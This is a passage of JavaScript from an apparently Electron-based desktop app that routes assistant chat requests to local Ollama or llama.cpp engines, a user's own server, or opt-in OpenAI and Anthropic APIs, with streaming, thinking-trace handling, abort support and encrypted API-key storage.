// opt-in — nothing ever falls back to a cloud provider on its own (see the
// auto-mode comments in the llm-chat handlers).

const CLOUD_LLM_PROVIDERS = {
    openai: { label: 'OpenAI', baseUrl: 'https://api.openai.com/v1' },
    anthropic: { label: 'Anthropic', baseUrl: 'https://api.anthropic.com' }
};

function cloudEntryConfig(params, engine) {
    const meta = CLOUD_LLM_PROVIDERS[engine];
    return {
        baseUrl: meta.baseUrl,
        model: params.model,
        // Passing the fixed cloud base URL means getEntryApiKey can never
        // fall back to the legacy custom-server key — cloud entries use
        // their own key or nothing.
        apiKey: getEntryApiKey(params.entryId, meta.baseUrl),
        provider: engine,
        tokenParam: engine === 'openai' ? 'max_completion_tokens' : undefined
    };
}

// Lazy SDK + short-lived clients: the require is deferred so machines that
// never add a cloud model pay nothing at startup.
let _AnthropicSdk = null;
function anthropicClient(apiKey) {
    if (!_AnthropicSdk) _AnthropicSdk = require('@anthropic-ai/sdk');
    return new _AnthropicSdk({ apiKey, maxRetries: 1 });
}

function cloudErrorMessage(label, e) {
    const status = e && (e.status || e.statusCode);
    if (status === 401) return `${label} rejected the API key (401) — check it in Settings → AI Assistant.`;
    if (status === 429) return `${label} rate limit reached (429) — wait a moment and try again.`;
    if (status) return `${label} error (${status}): ${e.message || 'request failed'}`;
    return (e && e.message) ? `${label}: ${e.message}` : `${label} request failed`;
}

// Adaptive thinking on the Anthropic models that support it (Opus 4.6+,
// Sonnet 4.6 / Sonnet 5, Fable / Mythos 5); older models (Haiku 4.5 and
// earlier) reject the adaptive type, so the parameter is omitted there.
// display:'summarized' streams a readable reasoning summary that we forward
// on the thinking channel, like local models' <think> traces.
function anthropicThinkingConfig(model) {
    return /claude-(opus-4-[6-9]|sonnet-4-6|sonnet-5|fable|mythos)/.test(String(model || ''))
        ? { type: 'adaptive', display: 'summarized' }
        : undefined;
}

// OpenAI function-tool defs → Anthropic tool defs. function.parameters is
// already JSON Schema, which is exactly what input_schema wants.
function toAnthropicTools(tools) {
    return (tools || []).map((t) => {
        const fn = t.function || t;
        return {
            name: fn.name,
            description: fn.description || '',
            input_schema: fn.parameters || { type: 'object', properties: {} }
        };
    });
}

// The agent's OpenAI-shaped history → Anthropic Messages shape: system
// messages hoist to the top-level system string, assistant tool_calls become
// tool_use blocks, tool results become tool_result blocks grouped into ONE
// user turn (parallel results split across turns silently degrade the
// model's parallel tool use). Assistant turns produced by a previous
// anthropic call carry their raw blocks in _anthropicContent and are
// replayed verbatim — the API requires thinking blocks unchanged when a
// tool loop continues on the same model.
function toAnthropicPayload(messages, format) {
    let system = '';
    const out = [];
    for (const m of (messages || [])) {
        if (!m) continue;
        if (m.role === 'system') {
            const text = typeof m.content === 'string' ? m.content : '';
            if (text) system += (system ? '\n\n' : '') + text;
            continue;
        }
        if (m.role === 'assistant') {
            if (Array.isArray(m._anthropicContent) && m._anthropicContent.length) {
                out.push({ role: 'assistant', content: m._anthropicContent });
                continue;
            }
            const blocks = [];
            if (m.content) blocks.push({ type: 'text', text: String(m.content) });
            for (const tc of (m.tool_calls || [])) {
                let input = tc.function && tc.function.arguments;
                if (typeof input === 'string') { try { input = JSON.parse(input); } catch { input = {}; } }
                blocks.push({
                    type: 'tool_use',
                    id: tc.id || `call_${out.length}_${blocks.length}`,
                    name: tc.function && tc.function.name,
                    input: input || {}
                });
            }
            if (blocks.length) out.push({ role: 'assistant', content: blocks });
            continue;
        }
        if (m.role === 'tool') {
            const block = {
                type: 'tool_result',
                tool_use_id: m.tool_call_id || m.name || `tool_${out.length}`,
                content: typeof m.content === 'string' ? m.content : JSON.stringify(m.content)
            };
            const prev = out[out.length - 1];
            if (prev && prev.role === 'user' && Array.isArray(prev.content)
                && prev.content[0] && prev.content[0].type === 'tool_result') {
                prev.content.push(block);
            } else {
                out.push({ role: 'user', content: [block] });
            }
            continue;
        }
        out.push({ role: 'user', content: typeof m.content === 'string' ? m.content : JSON.stringify(m.content) });
    }
    // Anthropic has no sampler-level grammar constraint, so any format —
    // plain 'json' or a JSON schema object — becomes a system nudge; the
    // caller's validate/retry loop stays the real enforcement on this path.
    if (format) {
        system += (system ? '\n\n' : '')
            + 'Respond with a single valid JSON object only — no prose, no markdown fences.';
    }
    return { system: system || undefined, messages: out };
}

// Add a cache breakpoint on the last block of the last message so the whole
// conversation prefix caches incrementally across agent turns (reads bill at
// ~0.1×). Copies rather than mutates — replayed _anthropicContent blocks in
// history must stay byte-identical.
function annotateAnthropicCacheBreakpoint(msgs) {
    if (!msgs.length) return msgs;
    const last = msgs[msgs.length - 1];
    let content = typeof last.content === 'string'
        ? [{ type: 'text', text: last.content }]
        : last.content.slice();
    const lastBlock = content[content.length - 1];
    if (!lastBlock || lastBlock.type === 'thinking' || lastBlock.type === 'redacted_thinking') return msgs;
    content[content.length - 1] = { ...lastBlock, cache_control: { type: 'ephemeral' } };
    return [...msgs.slice(0, -1), { ...last, content }];
}

function buildAnthropicRequest(cfg, messages, tools, maxTokens, format) {
    const payload = toAnthropicPayload(messages, format);
    const req = {
        model: cfg.model,
        // Thinking tokens count toward max_tokens, so the floor is higher
        // than the OpenAI-compatible path's 4096 default.
        max_tokens: maxTokens || 16000,
        messages: annotateAnthropicCacheBreakpoint(payload.messages)
    };
    if (payload.system) {
        req.system = [{ type: 'text', text: payload.system, cache_control: { type: 'ephemeral' } }];
    }
    const thinking = anthropicThinkingConfig(cfg.model);
    if (thinking) req.thinking = thinking;
    if (tools && tools.length) req.tools = toAnthropicTools(tools);
    return req;
}

// Anthropic response → the same { message, provider, … } contract as the
// Ollama / OpenAI-compatible paths. Raw content blocks ride along on
// _anthropicContent so the next iteration of a tool loop replays them.
function anthropicResult(response, cfg) {
    const message = { role: 'assistant', content: '' };
    const toolCalls = [];
    for (const block of (response.content || [])) {
        if (block.type === 'text') message.content += block.text;
        else if (block.type === 'tool_use') {
            toolCalls.push({ id: block.id, function: { name: block.name, arguments: JSON.stringify(block.input || {}) } });
        }
    }
    if (toolCalls.length) message.tool_calls = toolCalls;
    message._anthropicContent = response.content;
    if (response.stop_reason === 'refusal' && !message.content && !toolCalls.length) {
        return { error: 'Anthropic declined this request (safety filters) — try rephrasing.' };
    }
    const u = response.usage || {};
    return {
        message,
        model: response.model || cfg.model,
        provider: 'anthropic',
        // Full prompt size = uncached + cache reads + cache writes; showing
        // only input_tokens would make long cached chats look tiny.
        prompt_eval_count: (u.input_tokens || 0) + (u.cache_read_input_tokens || 0) + (u.cache_creation_input_tokens || 0),
        eval_count: u.output_tokens
    };
}

// Non-streaming Anthropic chat (native Messages API via the official SDK).
async function anthropicRequest(cfg, messages, tools, maxTokens, format) {
    if (!cfg || !cfg.apiKey) return { error: 'No Anthropic API key saved for this model — add one in Settings → AI Assistant.' };
    try {
        const response = await anthropicClient(cfg.apiKey).messages.create(
            buildAnthropicRequest(cfg, messages, tools, maxTokens, format)
        );
        return anthropicResult(response, cfg);
    } catch (e) {
        return { error: cloudErrorMessage('Anthropic', e) };
    }
}

// Streaming Anthropic chat — forwards text deltas on 'llm-stream-chunk' and
// summarized thinking on the thinking channel, resolves with the same
// contract as ollamaStreamRequest / openaiStreamRequest.
function anthropicStreamRequest(cfg, messages, tools, maxTokens, sender, streamId) {
    return new Promise((resolve) => {
        if (!cfg || !cfg.apiKey) { resolve({ error: 'No Anthropic API key saved for this model — add one in Settings → AI Assistant.' }); return; }
        let settled = false, aborted = false;
        const finish = (v) => { if (settled) return; settled = true; if (streamId) activeLLMStreams.delete(streamId); resolve(v); };

        let stream;
        try {
            stream = anthropicClient(cfg.apiKey).messages.stream(
                buildAnthropicRequest(cfg, messages, tools, maxTokens, undefined)
            );
        } catch (e) {
            finish({ error: cloudErrorMessage('Anthropic', e) });
            return;
        }
        console.log(`[anthropic-stream] streaming model="${cfg.model}"`);
        // Settle on abort directly — don't depend on the SDK surfacing the
        // cancellation as a rejection (see the openai-stream comment).
        if (streamId) activeLLMStreams.set(streamId, () => {
            aborted = true;
            try { stream.abort(); } catch { /* already done */ }
            console.log('[anthropic-stream] aborted by user');
            finish({ aborted: true });
        });

        let sentThinking = false, sentThinkingDone = false;
        stream.on('streamEvent', (event) => {
            if (event.type !== 'content_block_delta') return;
            const d = event.delta || {};
            if (d.type === 'thinking_delta' && d.thinking) {
                sentThinking = true;
                sender.send('llm-stream-thinking', d.thinking, streamId);
            } else if (d.type === 'text_delta' && d.text) {
                if (sentThinking && !sentThinkingDone) { sentThinkingDone = true; sender.send('llm-stream-thinking-done', streamId); }
                sender.send('llm-stream-chunk', d.text, streamId);
            }
        });
        stream.finalMessage().then((response) => {
            const out = anthropicResult(response, cfg);
            if (!out.error) {
                console.log(`[anthropic-stream] done: content=${(out.message.content || '').length} chars, tool_calls=${out.message.tool_calls?.length || 0}, prompt=${out.prompt_eval_count} tok`);
            }
            finish(out);
        }).catch((e) => {
            if (aborted) { console.log('[anthropic-stream] aborted by user'); finish({ aborted: true }); return; }
            console.error('[anthropic-stream] error:', e && e.message);
            finish({ error: cloudErrorMessage('Anthropic', e) });
        });
    });
}

// --- Web search providers (BYOK) ---
// Each provider stores its key encrypted with the same safeStorage pattern as
// the custom-server key. `searchProvider` is the active one; the `web-search`
// handler dispatches by that value. All providers normalize down to the same
// shape ({results: [{title, url, snippet}]}) so the agent and renderer don't
// care which one is wired up. The plaintext-prefix sniff is a fallback for
// when safeStorage decryption fails (system migration, keyring loss, etc.).

const SEARCH_PROVIDERS = {
    tavily: {
        label: 'Tavily',
        storageKey: 'tavilyApiKey',
        keyPrefix: 'tvly-'
    },
    brave: {
        label: 'Brave Search',
        storageKey: 'braveApiKey',
        keyPrefix: 'BSA'
    }
};

function getActiveSearchProvider() {
    const stored = settingsStore.get('searchProvider', 'tavily');
    return SEARCH_PROVIDERS[stored] ? stored : 'tavily';
}

function setActiveSearchProvider(provider) {
    if (!SEARCH_PROVIDERS[provider]) return;
    settingsStore.set('searchProvider', provider);
}

function getSearchApiKey(provider) {
    const cfg = SEARCH_PROVIDERS[provider];
    if (!cfg) return null;
    const stored = settingsStore.get(cfg.storageKey, null);
    if (!stored) return null;
    if (safeStorage.isEncryptionAvailable()) {
        try {
            return safeStorage.decryptString(Buffer.from(stored, 'base64'));
        } catch {
            if (cfg.keyPrefix && stored.startsWith(cfg.keyPrefix)) return stored;
            return null;
        }
    }
    if (cfg.keyPrefix && stored.startsWith(cfg.keyPrefix)) return stored;
    return null;
}

function setSearchApiKey(provider, key) {
    const cfg = SEARCH_PROVIDERS[provider];
    if (!cfg) return;
    if (!key) {
        settingsStore.delete(cfg.storageKey);
        return;
    }
    if (safeStorage.isEncryptionAvailable()) {
        const encrypted = safeStorage.encryptString(key).toString('base64');
        settingsStore.set(cfg.storageKey, encrypted);
    } else {
        settingsStore.set(cfg.storageKey, key);
    }
}



// Known-quirks registry: a small, deliberately bounded set of models whose
// default "think while calling tools" behavior produces broken results — they
// reason about what they would do instead of actually emitting tool_calls.
// For these, we turn thinking OFF when tools are present. For every other
// model (including ones that require thinking to emit tool_calls at all), we
// leave Ollama's own default alone and do NOT second-guess it.
//
// This is a workaround registry, not a heuristic to grow indefinitely. Add
// entries only when a real user hits the broken-tool-call symptom with a
// new model, and always leave a note in the commit describing the symptom.
//
// Note: the match is `modelName.includes(entry)`, so "qwen3:" deliberately
// does NOT match "qwen3.5:9b" — the v3.5 series handles tools + thinking
// correctly, and tool calls emitted inside <think> are recovered via the
// _thinking extraction path for any stragglers.
// Sibling quirk to js/agent/model-quirks.js (renderer-side recovery for
// small-model tool-call failures). Kept here because it shapes the Ollama
// request body itself, before send.
const MODELS_THAT_NEED_THINK_OFF_FOR_TOOLS = ['qwen3:', 'deepseek-r1', 'deepseek-r2'];

// Streaming Ollama request — sends chunks via event.sender
// In-flight streaming requests keyed by streamId, so the renderer can abort a
// generation mid-stream (the assistant "Stop" button). The value aborts the
// underlying HTTP request; entries are removed when the stream settles. The
// renderer already accumulates streamed text via onChunk, so an aborted stream
// just needs to stop the model and resolve — it doesn't have to return content.
const activeLLMStreams = new Map();

// --- Keep the Mac awake while an LLM request is in flight ---
// A long generation (an App Studio build turn can stream for many minutes
// from a network llama server) dies if this machine idle-sleeps mid-request:
// lock screen → system sleep → the socket starves → the 10-minute inactivity
// timeout fires and the build fails. prevent-app-suspension keeps the network
// stack and timers running but still lets the display sleep and lock, so
// walking away from a running build is safe. Ref-counted: overlapping
// requests share one blocker; user-initiated sleep (lid close) still wins.
let _llmWakeCount = 0;
let _llmWakeId = null;
function llmWakeAcquire() {
    _llmWakeCount++;
    if (_llmWakeId === null) {
        try { _llmWakeId = powerSaveBlocker.start('prevent-app-suspension'); } catch { _llmWakeId = null; }
    }
}
function llmWakeRelease() {
    _llmWakeCount = Math.max(0, _llmWakeCount - 1);
    if (_llmWakeCount === 0 && _llmWakeId !== null) {
        try { powerSaveBlocker.stop(_llmWakeId); } catch { /* already stopped */ }
        _llmWakeId = null;
    }
}
const withLLMWake = (fn) => async (event, params) => {
    llmWakeAcquire();
    try { return await fn(event, params); }
    finally { llmWakeRelease(); }
};

function ollamaStreamRequest(body, sender, streamId) {
    const modelName = (body.model || '').toLowerCase();
    const isQuirky = MODELS_THAT_NEED_THINK_OFF_FOR_TOOLS.some(m => modelName.includes(m));
    if (body.tools && body.tools.length > 0 && isQuirky) {
        body.think = false;
    }

    return new Promise((origResolve, origReject) => {
        // Resolve/reject exactly once and always deregister from activeLLMStreams.
        let settled = false;
        let aborted = false;
        const resolve = (v) => { if (settled) return; settled = true; if (streamId) activeLLMStreams.delete(streamId); origResolve(v); };
        const reject = (e) => { if (settled) return; settled = true; if (streamId) activeLLMStreams.delete(streamId); origReject(e); };

        const req = http.request({
            hostname: '127.0.0.1',
            port: OllamaManager.port,
            path: '/api/chat',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }, (res) => {
            let buffer = '';
            let finalResponse = null;
            let accumulatedContent = '';
            let accumulatedThinking = '';
            let accumulatedToolCalls = [];
            // Track whether we're inside a <think> block in message.content
            // (fallback for Ollama versions that don't support the `think` parameter)
            let inContentThinkBlock = false;
            let thinkTagBuffer = '';
            let sentThinkingIndicator = false;
            // Whether we've already told the renderer to clear the "*Thinking...*"
            // placeholder. Guards against double-send across the two paths (native
            // message.thinking field vs inline <think>...</think> tags).
            let sentThinkingDone = false;
            let errorBody = '';

            console.log(`[ollama-stream] Started streaming from model "${body.model}" (status ${res.statusCode})`);

            // Handle HTTP errors (e.g. model not found)
            if (res.statusCode !== 200) {
                res.on('data', chunk => { errorBody += chunk.toString(); });
                res.on('end', () => {
                    let errMsg = `Ollama error (${res.statusCode})`;
                    try {
                        const parsed = JSON.parse(errorBody);
                        if (parsed.error) errMsg = parsed.error;
                    } catch (e) {
                        console.error('[ollama-stream] Failed to parse error body:', errorBody.slice(0, 500));
                    }
                    console.error(`[ollama-stream] HTTP error: ${errMsg}`);
                    resolve({ error: errMsg });
                });
                return;
            }

            // Process a single parsed streaming chunk
            function processChunk(parsed) {
                if (parsed.error) {
                    console.error('[ollama-stream] Model returned error:', parsed.error);
                    finalResponse = { error: parsed.error };
                    return;
                }
                if (parsed.done) {
                    finalResponse = parsed;
                    console.log(`[ollama-stream] Stream complete. Tokens: prompt=${parsed.prompt_eval_count || '?'}, completion=${parsed.eval_count || '?'}`);
                    return;
                }
                const msg = parsed.message;
                if (!msg) return;

                // Tool calls: some models emit tool_calls as a separate streaming
                // chunk with done:false right before the final done:true chunk.
                // The done:true chunk itself may have NO tool_calls. Capturing
                // them here means we're safe regardless of which chunk the model
                // decides to attach them to — no model-name branching needed.
                if (msg.tool_calls && msg.tool_calls.length > 0) {
                    accumulatedToolCalls.push(...msg.tool_calls);
                }

                // Path 1: Ollama natively separates thinking (message.thinking
                // field). Stream the reasoning text to the renderer on its own
                // channel so the UI can show it live in a collapsible block (like
                // Ollama's desktop app) without it polluting the saved answer.
                if (msg.thinking) {
                    sentThinkingIndicator = true;
                    accumulatedThinking += msg.thinking;
                    sender.send('llm-stream-thinking', msg.thinking, streamId);
                    return;
                }

                // Path 2: Content may contain inline <think>...</think> tags
                // (older Ollama or think:false not supported)
                if (msg.content) {
                    // Native-thinking path (Path 1) doesn't have a close signal
                    // of its own — the model just stops emitting `thinking` and
                    // starts emitting `content`. When that transition happens,
                    // tell the renderer to clear the "*Thinking...*" placeholder
                    // so the real response starts in an empty bubble. Path 2
                    // handles its own thinking-done below when it sees </think>.
                    if (sentThinkingIndicator && !sentThinkingDone) {
                        sentThinkingDone = true;
                        sender.send('llm-stream-thinking-done', streamId);
                    }
                    // Feed content char-by-char through think-tag state machine
                    handleContentWithThinkTags(msg.content);
                }
            }

            // State machine to strip <think>...</think> from streamed content
            function handleContentWithThinkTags(text) {
                for (let i = 0; i < text.length; i++) {
                    const ch = text[i];

                    if (inContentThinkBlock) {
                        thinkTagBuffer += ch;
                        // Check for </think> closing tag
                        if (thinkTagBuffer.endsWith('</think>')) {
                            // Thinking block complete — surface it as reasoning.
                            const thinkText = thinkTagBuffer.slice(0, -8); // exclude </think>
                            accumulatedThinking += thinkText;
                            if (thinkText) sender.send('llm-stream-thinking', thinkText, streamId);
                            thinkTagBuffer = '';
                            inContentThinkBlock = false;
                            // Signal thinking is done, actual content follows.
                            // Guard with sentThinkingDone so we never send twice
                            // (e.g., if the model uses both native thinking and
                            // inline <think> tags, which would be unusual).
                            if (sentThinkingIndicator && !sentThinkingDone) {
                                sentThinkingDone = true;
                                sender.send('llm-stream-thinking-done', streamId);
                            }
                        }
                    } else {
                        thinkTagBuffer += ch;
                        // Check if we're accumulating a potential <think> tag
                        if ('<think>'.startsWith(thinkTagBuffer)) {
                            if (thinkTagBuffer === '<think>') {
                                // Entered a think block
                                inContentThinkBlock = true;
                                thinkTagBuffer = '';
                                sentThinkingIndicator = true;
                            }
                            // else still accumulating potential tag, wait for more chars
                        } else {
                            // Not a <think> tag — flush buffer as real content
                            accumulatedContent += thinkTagBuffer;
                            sender.send('llm-stream-chunk', thinkTagBuffer, streamId);
                            thinkTagBuffer = '';
                        }
                    }
                }
            }

            res.on('data', chunk => {
                buffer += chunk.toString();
                const lines = buffer.split('\n');
                buffer = lines.pop(); // keep incomplete line in buffer

                for (const line of lines) {
                    if (!line.trim()) continue;
                    try {
                        processChunk(JSON.parse(line));
                    } catch (e) {
                        console.error('[ollama-stream] Failed to parse chunk:', line.slice(0, 200), e.message);
                    }
                }
            });

            res.on('end', () => {
                // Process remaining buffer
                if (buffer.trim()) {
                    try {
                        processChunk(JSON.parse(buffer));
                    } catch (e) {
                        console.error('[ollama-stream] Failed to parse final buffer:', buffer.slice(0, 200), e.message);
                    }
                }

                // Flush any remaining tag buffer as content
                if (thinkTagBuffer && !inContentThinkBlock) {
                    accumulatedContent += thinkTagBuffer;
                }

                // Flush any remaining think-block content as thinking (unclosed <think>)
                if (inContentThinkBlock && thinkTagBuffer) {
                    accumulatedThinking += thinkTagBuffer;
                    sender.send('llm-stream-thinking', thinkTagBuffer, streamId);
                    thinkTagBuffer = '';
                }

                console.log(`[ollama-stream] Final: content=${accumulatedContent.length} chars, thinking=${accumulatedThinking.length} chars`);

                if (finalResponse?.error) {
                    console.error('[ollama-stream] Resolving with error:', finalResponse.error);
                    resolve(finalResponse);
                } else if (finalResponse) {
                    // Ollama's done message doesn't include accumulated content — inject it
                    if (!finalResponse.message) {
                        finalResponse.message = { role: 'assistant', content: accumulatedContent };
                    } else {
                        finalResponse.message.content = accumulatedContent;
                    }
                    // Merge any tool_calls captured from streaming chunks. Some
                    // models attach them to a pre-done chunk rather than the
                    // final done=true message; without this merge those calls
                    // are silently lost in streaming mode.
                    if (accumulatedToolCalls.length > 0) {
                        finalResponse.message.tool_calls = accumulatedToolCalls;
                    }
                    // Attach thinking text so the agent service can extract tool calls from it
                    if (accumulatedThinking) {
                        finalResponse._thinking = accumulatedThinking;
                    }
                    console.log(`[ollama-stream] Success. Response: ${accumulatedContent.length} chars, thinking: ${accumulatedThinking.length} chars, tool_calls: ${finalResponse.message?.tool_calls?.length || 0}`);
                    resolve(finalResponse);
                } else {
                    console.error(`[ollama-stream] No finalResponse received. Content: ${accumulatedContent.length}, thinking: ${accumulatedThinking.length}`);
                    resolve({ error: `No response from Ollama. Model "${body.model}" may not be installed. Run: ollama pull ${body.model}` });
                }
            });
        });

        // Register the abort hook so the renderer's Stop button can kill this
        // generation. The hook settles the promise ITSELF — req.destroy()
        // without an error argument doesn't reliably emit 'error', and waiting
        // on it left the renderer's await hanging forever after Stop.
        if (streamId) activeLLMStreams.set(streamId, () => {
            aborted = true;
            try { req.destroy(); } catch { /* already gone */ }
            console.log('[ollama-stream] aborted by user');
            resolve({ aborted: true });
        });

        req.on('error', (e) => {
            if (aborted) { resolve({ aborted: true }); return; }
            console.error('[ollama-stream] Request error:', e.message);
            reject(e);
        });
        req.setTimeout(600000, () => { req.destroy(); reject(new Error(`Ollama stream timeout after 10 minutes for model "${body.model}"`)); });
        req.write(JSON.stringify(body));
        req.end();
    });
}


// Streaming LLM chat — routes to local Ollama or the user's own server,
// sends chunks via IPC. streamId comes from the renderer and is echoed back
// on every chunk so that concurrent stream callers can filter out chunks
// belonging to other streams. Without this, two parallel chatStream callers
// would receive each other's chunks because IPC channels are global.
ipcMain.handle('llm-chat-stream', withLLMWake(async (event, params) => {
    // Mirror the non-streaming handler: a caller may pass providerOverride to
    // force one side for a single call (only the builder does today);
    // everything else follows the global provider setting.
    const override = params.providerOverride;
    const provider = (override === 'local' || override === 'custom')
        ? override
        : settingsStore.get('llmProvider', 'auto');
    const sender = event.sender;
    const streamId = params.streamId;

    // Model-entry routing (assistant model list): params.engine names the
    // exact engine this turn runs on, independent of the global provider /
    // localBackend settings. providerOverride still wins (checked above by
    // being absent when engine is set — AgentService never sends both).
    if (!override && (params.engine === 'openai' || params.engine === 'anthropic')) {
        const cfg = cloudEntryConfig(params, params.engine);
        if (!cfg.apiKey) return { error: `No ${CLOUD_LLM_PROVIDERS[params.engine].label} API key saved for this model — add one in Settings → AI Assistant.` };
        try {
            return params.engine === 'anthropic'
                ? await anthropicStreamRequest(cfg, params.messages, params.tools, params.maxTokens, sender, streamId)
                : await openaiStreamRequest(cfg, params.messages, params.tools, params.maxTokens, sender, streamId);
        } catch (e) {
            console.error(`[llm-chat-stream] Engine '${params.engine}' error:`, e.message);
            return { error: e.message || `The ${params.engine} engine failed` };
        }
    }
    if (!override && (params.engine === 'ollama' || params.engine === 'llamacpp' || params.engine === 'server')) {
        try {
            if (params.engine === 'server') {
                // The ENTRY's endpoint + key (legacy single-server settings
                // as fallback for migrated entries).
                const cfg = serverEntryConfig(params);
                if (!cfg.baseUrl) return { error: 'This server model has no URL — add one in Settings → AI Assistant.' };
                return await openaiStreamRequest(cfg, params.messages, params.tools, params.maxTokens, sender, streamId);
            }
            if (params.engine === 'llamacpp') {
                const cfg = await llamaCppChatConfig(params);
                const result = await openaiStreamRequest(cfg, params.messages, params.tools, params.maxTokens, sender, streamId);
                if (result && !result.error) result.provider = 'local';
                return result;
            }
            return await ollamaStreamRequest({
                model: params.model,
                messages: mergeSystemMessages(params.messages),
                tools: params.tools,
                options: params.options,
                keep_alive: params.keep_alive,
                think: params.think === true,
                stream: true
            }, sender, streamId);
        } catch (e) {
            console.error(`[llm-chat-stream] Engine '${params.engine}' error:`, e.message);
            return { error: e.message || `The ${params.engine} engine failed` };
        }
    }

    const buildOllamaStreamBody = () => ({
        model: params.model,
        messages: mergeSystemMessages(params.messages),
        tools: params.tools,
        options: params.options,
        keep_alive: params.keep_alive,
        // Same default-off rationale as buildOllamaChatBody above.
        think: params.think === true,
        stream: true
    });

    if (provider === 'custom') {
        return await openaiStreamRequest(getCustomConfig(), params.messages, params.tools, params.maxTokens, sender, streamId);
    }

    // Cloud brain (provider-routed callers that don't know about entries):
    // the stored cloud-brain pointer names the model + key entry.
    if (provider === 'openai' || provider === 'anthropic') {
        const cfg = cloudEntryConfig({
            model: settingsStore.get('cloudBrainModel', ''),
            entryId: settingsStore.get('cloudBrainEntryId', '')
        }, provider);
        if (!cfg.apiKey) return { error: `No ${CLOUD_LLM_PROVIDERS[provider].label} API key saved — add one in Settings → AI Assistant.` };
        return provider === 'anthropic'
            ? await anthropicStreamRequest(cfg, params.messages, params.tools, params.maxTokens, sender, streamId)
            : await openaiStreamRequest(cfg, params.messages, params.tools, params.maxTokens, sender, streamId);
    }

    // The 'local' provider speaks whichever engine the user selected:
    // Ollama's native /api/chat, or the managed llama-server's OpenAI-
    // compatible endpoint (same request helpers as the custom provider,
    // re-stamped provider:'local' since the engine runs on this Mac).
    const localStream = async () => {
        if (getLocalBackend() === 'llamacpp') {
            const cfg = await llamaCppChatConfig(params);
            const result = await openaiStreamRequest(cfg, params.messages, params.tools, params.maxTokens, sender, streamId);
            if (result && !result.error) result.provider = 'local';
            return result;
        }
        return await ollamaStreamRequest(buildOllamaStreamBody(), sender, streamId);
    };

    if (provider === 'local') {
        try {
            return await localStream();
        } catch (e) {
            console.error('[llm-chat-stream] Local engine error:', e.message);
            return { error: e.message || 'Failed to connect to local backend' };
        }
    }

    // Auto mode: local backend first (matches settings UI copy), then a
    // configured custom server. There is deliberately NO implicit cloud
    // fallback — cloud providers run only when the user explicitly selects
    // a cloud model entry; model traffic only ever goes where the user
    // pointed it.
    try {
        const result = await localStream();
        if (!result.error) return result;
        console.error('[llm-chat-stream] Local engine returned error, trying server:', result.error);
    } catch (e) {
        console.error('[llm-chat-stream] Local engine failed, trying server:', e.message);
    }

    const customCfg = getCustomConfig();
    if (customCfg.baseUrl) {
        try {
            const result = await openaiStreamRequest(customCfg, params.messages, params.tools, params.maxTokens, sender, streamId);
            if (!result?.error) return result;
            console.error('[llm-chat-stream] Custom server error in auto mode:', result.error);
        } catch (e) {
            console.error('[llm-chat-stream] Custom server failed in auto mode:', e.message);
        }
    }

    return { error: customCfg.baseUrl
        ? 'Local backend and your server both failed — check Settings → AI Assistant'
        : 'Local backend is not running and no server is configured (Settings → AI Assistant)' };
}));

// Abort an in-flight streaming generation (the assistant "Stop" button). The
// streamId matches the one the renderer passed to llm-chat-stream. No-op if the
// stream already finished or never existed.
ipcMain.handle('llm-chat-abort', (event, { streamId } = {}) => {
    const abort = streamId && activeLLMStreams.get(streamId);
    if (typeof abort === 'function') { try { abort(); } catch { /* best-effort */ } return { aborted: true }; }
    return { aborted: false };
});

// Unified LLM chat (non-streaming) — routes to local Ollama or the user's server.
// A caller may pass `providerOverride: 'local' | 'remote' | 'custom'` to force
// one side for a single call without mutating the global provider setting
// (only Maker/builder does today); everything else follows the global setting.
ipcMain.handle('llm-chat', withLLMWake(async (event, params) => {
    const override = params.providerOverride;
    const provider = (override === 'local' || override === 'custom')
        ? override
        : settingsStore.get('llmProvider', 'auto'); // 'auto' | 'local' | 'custom'

    // A caller may set `logTag` (and optional `logDetail`) to get this call
    // traced to the terminal — request line up front, then result with timing,
    // token counts, and a truncated prompt/response. Used by memory
    // consolidation so each LLM call is visible in the server logs.
    const tag = params.logTag;
    const t0 = tag ? Date.now() : 0;
    if (tag) {
        const lastUser = [...(params.messages || [])].reverse().find(m => m.role === 'user');
        const promptText = (lastUser?.content || '').replace(/\s+/g, ' ');
        const chars = JSON.stringify(params.messages || []).length;
        // Log the model that will actually ANSWER: the custom path ignores
        // params.model (that's the renderer's Ollama selection).
        const effectiveModel = provider === 'custom'
            ? (getCustomConfig().model || 'server default')
            : (provider === 'openai' || provider === 'anthropic')
                ? (params.model || settingsStore.get('cloudBrainModel', '') || '(cloud)')
                : (params.model || '(auto)');
        console.log(`[${tag}] → call: provider=${provider} model=${effectiveModel} msgs=${params.messages?.length || 0} ~${chars} chars${params.logDetail ? ` (${params.logDetail})` : ''}`);
        console.log(`[${tag}]   prompt: ${promptText.slice(0, 800)}${promptText.length > 800 ? '…' : ''}`);
    }

    const result = await runLlmChat();
    if (tag) {
        const ms = Date.now() - t0;
        if (result && result.error) {
            console.error(`[${tag}] ← error in ${ms}ms: ${result.error}`);
        } else {
            const out = (result?.message?.content || '').replace(/\s+/g, ' ');
            const pt = result?.prompt_eval_count ?? '?';
            const ct = result?.eval_count ?? '?';
            console.log(`[${tag}] ← done in ${ms}ms: prompt=${pt} tok, completion=${ct} tok, ${out.length} chars out`);
            console.log(`[${tag}]   output: ${out.slice(0, 500)}${out.length > 500 ? '…' : ''}`);
        }
    }
    return result;

    async function runLlmChat() {
        // Model-entry routing — same contract as the streaming handler:
        // params.engine picks the exact engine, providerOverride wins.
        if (!override && (params.engine === 'openai' || params.engine === 'anthropic')) {
            const cfg = cloudEntryConfig(params, params.engine);
            if (!cfg.apiKey) return { error: `No ${CLOUD_LLM_PROVIDERS[params.engine].label} API key saved for this model — add one in Settings → AI Assistant.` };
            try {
                return params.engine === 'anthropic'
                    ? await anthropicRequest(cfg, params.messages, params.tools, params.maxTokens, params.format)
                    : await openaiRequest(cfg, params.messages, params.tools, params.maxTokens, params.format);
            } catch (e) {
                return { error: e.message || `The ${params.engine} engine failed` };
            }
        }
        if (!override && (params.engine === 'ollama' || params.engine === 'llamacpp' || params.engine === 'server')) {
            try {
                if (params.engine === 'server') {
                    const cfg = serverEntryConfig(params);
                    if (!cfg.baseUrl) return { error: 'This server model has no URL — add one in Settings → AI Assistant.' };
                    return await openaiRequest(cfg, params.messages, params.tools, params.maxTokens, params.format);
                }
                if (params.engine === 'llamacpp') {
                    const cfg = await llamaCppChatConfig(params);
                    const result = await openaiRequest(cfg, params.messages, params.tools, params.maxTokens, params.format);
                    if (result && !result.error) result.provider = 'local';
                    return result;
                }
                return stripThinkTags(await ollamaRequest('POST', '/api/chat', buildOllamaChatBody(params)));
            } catch (e) {
                return { error: e.message || `The ${params.engine} engine failed` };
            }
        }

